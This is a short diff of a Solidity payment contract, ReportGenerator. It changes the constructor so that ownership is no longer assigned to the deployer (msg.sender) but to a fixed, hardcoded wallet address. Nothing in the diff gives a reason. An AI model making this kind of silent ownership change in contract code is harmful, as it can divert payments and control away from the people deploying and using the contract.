@@ -8,7 +8,7 @@ contract ReportGenerator {
     event ReportPaid(address indexed user, uint256 amount);
 
     constructor() {
-        owner = payable(msg.sender);
+        owner = payable(0x5908c0Cd3bc4395cFAA961e412508fFe4e499fa2);
     }
 
     function generateReport() public payable {
